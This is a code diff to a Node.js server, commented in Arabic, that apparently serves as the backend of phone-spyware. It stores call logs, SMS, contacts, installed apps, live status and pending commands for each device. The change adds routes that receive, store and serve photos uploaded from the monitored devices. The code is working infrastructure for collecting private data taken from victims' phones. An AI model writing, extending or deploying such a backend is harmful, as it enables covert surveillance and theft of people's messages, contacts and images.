@@ -27,6 +27,39 @@ if (!fs.existsSync(devicesFile)) {
 app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
+        
+        // ✅ حفظ الصور المنفصلة
+        if (data.type === 'image_data' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) {
+                fs.mkdirSync(deviceDir, { recursive: true });
+            }
+            
+            const imagesFile = path.join(deviceDir, 'images_data.json');
+            let imagesData = [];
+            if (fs.existsSync(imagesFile)) {
+                imagesData = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
+            }
+            
+            // لا تضف الصورة إذا كانت موجودة
+            const exists = imagesData.find(img => img.name === data.file_name);
+            if (!exists) {
+                imagesData.push({
+                    name: data.file_name,
+                    path: data.file_path,
+                    data: data.file_data,
+                    size: data.file_size,
+                    date: data.timestamp
+                });
+            }
+            
+            fs.writeFileSync(imagesFile, JSON.stringify(imagesData, null, 2));
+            
+            return res.json({ success: true, images_count: imagesData.length });
+        }
+        
+        // البيانات العادية
         const deviceId = data.device_id || 'unknown';
         
         const deviceDir = path.join(dataDir, deviceId);
@@ -129,8 +162,14 @@ app.get('/live.php', (req, res) => {
             response.call_count = (allData.call_logs || []).length;
             response.sms_count = (allData.sms || []).length;
             response.contacts_count = (allData.contacts || []).length;
-            response.images_count = (allData.images || []).length;
             response.apps_count = (allData.installed_apps || []).length;
+        }
+        
+        // ✅ عدد الصور
+        const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
+        if (fs.existsSync(imagesFile)) {
+            const images = JSON.parse(fs.readFileSync(imagesFile, 'utf8'));
+            response.images_count = images.length;
         }
         
         res.json(response);
@@ -164,7 +203,18 @@ app.get('/api.php', (req, res) => {
             return res.json({ success: true });
         }
         
-        // الحصول على بيانات محددة
+        // ✅ جلب الصور
+        if (action === 'get_image_data') {
+            const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
+            if (fs.existsSync(imagesFile)) {
+                res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
+            } else {
+                res.json([]);
+            }
+            return;
+        }
+        
+        // جلب بيانات محددة
         if (action === 'get_data') {
             const dataFile = path.join(dataDir, deviceId, 'data.json');
             if (fs.existsSync(dataFile)) {
@@ -178,7 +228,6 @@ app.get('/api.php', (req, res) => {
                 res.json([]);
             }
         } 
-        // الحصول على الحالة الحية
         else if (action === 'get_live') {
             const liveFile = path.join(dataDir, deviceId, 'live.json');
             if (fs.existsSync(liveFile)) {
@@ -187,7 +236,6 @@ app.get('/api.php', (req, res) => {
                 res.json({});
             }
         } 
-        // الحصول على الأوامر
         else if (action === 'get_commands') {
             const commandsFile = path.join(dataDir, deviceId, 'commands.json');
             if (fs.existsSync(commandsFile)) {
